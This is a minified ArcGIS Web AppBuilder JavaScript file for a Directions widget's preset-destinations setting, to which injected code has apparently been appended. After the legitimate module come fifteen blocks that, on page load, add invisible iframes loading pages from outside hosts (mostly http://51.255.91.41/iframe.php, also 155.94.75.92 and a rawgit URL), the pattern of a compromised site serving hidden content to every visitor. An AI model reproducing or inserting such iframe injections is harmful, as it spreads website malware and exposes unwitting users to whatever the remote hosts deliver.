// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Directions/setting/PresetDestinations.html":'\x3cdiv\x3e\r\n  \x3cspan class\x3d"title"\x3e${nls.presetDestinations}\x3c/span\x3e\r\n  \x3ctable style\x3d"width:100%;" cellspacing\x3d"0"\x3e\r\n    \x3ctbody\x3e\r\n    \x3ctr\x3e\r\n      \x3ctd style\x3d"width:50%;"\x3e\r\n        \x3ctable style\x3d"width:100%;" cellspacing\x3d"0"\x3e\r\n          \x3ctbody\x3e\r\n          \x3ctr\x3e\r\n            \x3ctd style\x3d"width:200px;"\x3e\r\n              \x3cspan class\x3d"impedance-attribute jimu-ellipsis"\x3e${nls.startPoint}\x3c/span\x3e\r\n            \x3c/td\x3e\r\n            \x3ctd style\x3d"width:auto;"\x3e\r\n              \x3cspan data-dojo-attach-point\x3d"startSearchDom" style\x3d"width:220px;"\x3e\x3c/span\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"startSearchResultsNode" class\x3d"searchResults arcgisSearch"\x3e\x3c/div\x3e\r\n              \x3c!--\x3cdiv data-dojo-attach-point\x3d"startSearchError" class\x3d"hide preset-des-error"\x3eNo Results\x3c/div\x3e--\x3e\r\n            \x3c/td\x3e\r\n\r\n            \x3ctd style\x3d"width:200px;"\x3e\r\n              \x3cspan class\x3d"impedance-attribute jimu-ellipsis"\x3e${nls.endPoint}\x3c/span\x3e\r\n            \x3c/td\x3e\r\n            \x3ctd style\x3d"width:auto;"\x3e\r\n              \x3cspan data-dojo-attach-point\x3d"endSearchDom" class\x3d"end-search" style\x3d"width:220px;"\x3e\x3c/span\x3e\r\n              \x3cdiv data-dojo-attach-point\x3d"endSearchResultsNode" class\x3d"searchResults arcgisSearch"\x3e\x3c/div\x3e\r\n              \x3c!--\x3cdiv data-dojo-attach-point\x3d"endSearchError" class\x3d"hide preset-des-error"\x3eNo Results\x3c/div\x3e--\x3e\r\n            \x3c/td\x3e\r\n          \x3c/tr\x3e\r\n          \x3c/tbody\x3e\r\n        \x3c/table\x3e\r\n      \x3c/td\x3e\r\n    \x3c/tr\x3e\r\n    \x3c/tbody\x3e\r\n  \x3c/table\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/on dojo/_base/html dojo/query esri/lang esri/tasks/locator dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./PresetDestinations.html esri/dijit/Search jimu/dijit/RadioBtn".split(" "),function(q,c,f,e,l,r,t,u,v,w,x,n){return q([u,v,w],{templateString:x,_defaultLocations:null,_startSearchResults:null,_endSearchResults:null,_isSearchResultsShown:!1,_ERROR_CLASS:"have-error",constructor:function(a){a&&(this._defaultLocations=
a.defaultLocations,this.nls=a.nls)},postCreate:function(){this.inherited(arguments)},startup:function(){this.startSearch=new n({enableSuggestions:!1,enableButtonMode:!1,theme:"arcgisSearch"});this.startSearch.placeAt(this.startSearchDom);this.own(f(this.startSearch,"search-results",c.hitch(this,"_onStartSearchResults")));this.own(f(this.startSearchResultsNode,"li:click",c.hitch(this,"_onSelectStartSearchResult")));this.own(f(this.startSearch.inputNode,"focus",c.hitch(this,"_onCleanStartError")));
this.own(f(this.startSearch.inputNode,"blur",c.hitch(this,function(){!1===this._isSearchResultsShown&&this.startSearch&&this.startSearch.search&&this.startSearch.search()})));this.endSearch=new n({enableSuggestions:!1,enableButtonMode:!1,theme:"arcgisSearch"});this.endSearch.placeAt(this.endSearchDom);this.own(f(this.endSearch,"search-results",c.hitch(this,"_onEndSearchResults")));this.own(f(this.endSearchResultsNode,"li:click",c.hitch(this,"_onSelectEndSearchResult")));this.own(f(this.endSearch.inputNode,
"focus",c.hitch(this,"_onCleanEndError")));this.own(f(this.endSearch.inputNode,"blur",c.hitch(this,function(){!1===this._isSearchResultsShown&&this.endSearch&&this.endSearch.search&&this.endSearch.search()})));this.own(f(window.document,"click",c.hitch(this,function(a){e.isDescendant(a.target,this.searchResultsNode)||this._hideResultMenu()})));if(this._defaultLocations&&this._defaultLocations.length&&0<this._defaultLocations.length)for(var a=0,b=this._defaultLocations.length;a<b;a++)0===a?this.startSearch.set("value",
this.defaultLocations[a]):1===a&&this.endSearch.set("value",this.defaultLocations[a]);this.inherited(arguments)},getValue:function(){var a=[],b=this.startSearch.get("value");a.push(b);b=this.endSearch.get("value");a.push(b);return a},setValue:function(a){a&&0<a.length&&(this._defaultLocations=a)},validate:function(){var a=!1;l(".searchLoading",this.domNode).forEach(c.hitch(this,function(){a=!0}));return!1!==a||e.hasClass(this.startSearch,this._ERROR_CLASS)||e.hasClass(this.endSearch,this._ERROR_CLASS)?
!1:!0},setSources:function(a){a&&a.url&&a.singleLineFieldName?(a={locator:new t(a.url||""),outFields:["*"],singleLineFieldName:a.singleLineFieldName},this.startSearch.set("sources",[a]),this.endSearch.set("sources",[a])):(this.startSearch.set("sources",[]),this.endSearch.set("sources",[]))},_onCleanError:function(a){e.removeClass(a,this._ERROR_CLASS)},_onCleanStartError:function(){this._onCleanError(this.startSearch)},_onCleanEndError:function(){this._onCleanError(this.endSearch)},_onStartSearchResults:function(a){this._onSearchResults(a,
{searchDijit:this.startSearch,searchResultsNode:this.startSearchResultsNode,searchError:this.startSearchError,results:"start"})},_onEndSearchResults:function(a){this._onSearchResults(a,{searchDijit:this.endSearch,searchResultsNode:this.endSearchResultsNode,searchError:this.endSearchError,results:"end"})},_onSearchResults:function(a,b){var c=b.searchDijit.get("sources"),d=b.searchDijit.get("activeSourceIndex"),f=b.searchDijit.get("value"),g="",h=a.results;if(""!==f)if(h&&0<a.numResults){"start"===
b.results?this._startSearchResults=h:"end"===b.results&&(this._endSearchResults=h);var g=g+'\x3cdiv class\x3d"searchMenu searchResultsMenu" role\x3d"menu"\x3e',k;for(k in h)if(h[k]&&h[k].length){a=c[parseInt(k,10)].name;1<c.length&&"all"===d&&(g+='\x3cdiv title\x3d"'+a+'" class\x3d"menuHeader"\x3e'+a+"\x3c/div\x3e");g+="\x3cul\x3e";a=new RegExp("("+f+")","gi");for(var l=c[k].maxResults||5,m=0,n=h[k].length;m<n&&m<l;m++)var p=r.isDefined(h[k][m].name)?h[k][m].name:this.nls.untitled,g=g+('\x3cli title\x3d"'+
p+'" data-index\x3d"'+m+'" data-source-index\x3d"'+k+'" role\x3d"menuitem" tabindex\x3d"0"\x3e'+p.toString().replace(a,"\x3cstrong \x3e$1\x3c/strong\x3e")+"\x3c/li\x3e");g+="\x3c/url\x3e"}b.searchResultsNode.innerHTML=g+"\x3c/div\x3e";this._showResultMenu(b.searchDijit,b.searchResultsNode);this._resetSelectorPosition(b.searchDijit,".searchResultsMenu")}else e.addClass(b.searchDijit,this._ERROR_CLASS),this._resetSelectorPosition(b.searchDijit,".noResultsMenu")},_onSelectStartSearchResult:function(a){this._onSelectSearchResult(a,
this.startSearch,this._startSearchResults)},_onSelectEndSearchResult:function(a){this._onSelectSearchResult(a,this.endSearch,this._endSearchResults)},_onSelectSearchResult:function(a,b,c){for(a=a.target;!e.hasAttr(a,"data-source-index")||!e.getAttr(a,"data-index");)a=a.parentNode;var d=null,d=e.getAttr(a,"data-source-index");a=parseInt(e.getAttr(a,"data-index"),10);"all"!==d&&(d=parseInt(d,10));c&&c[d]&&c[d][a]&&(d=c[d][a],b.select(d),d.name&&b.set("value",d.name))},_showResultMenu:function(a,b){e.setStyle(b,
"display","block");l(".searchMenu",b).style("display","block");this._isSearchResultsShown=!0;if(a=l(".searchInputGroup",a.domNode)[0])a={width:e.getMarginBox(a).w+"px"},l(".searchMenu",b).style(a)},_resetSelectorPosition:function(a,b){var f=e.getMarginBox(this.domNode.offsetParent);l(b,this.domNode).forEach(c.hitch(this,function(c){var d=e.position(c),g=e.position(a.domNode),g=".noResultsMenu"===b?0:g.h;d.y+d.h>f.h&&e.setStyle(c,"top",-(d.h+g)-4+"px")}))},_hideResultMenu:function(){l(".searchMenu",
this.domNode).style("display","none");this._isSearchResultsShown=!1}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});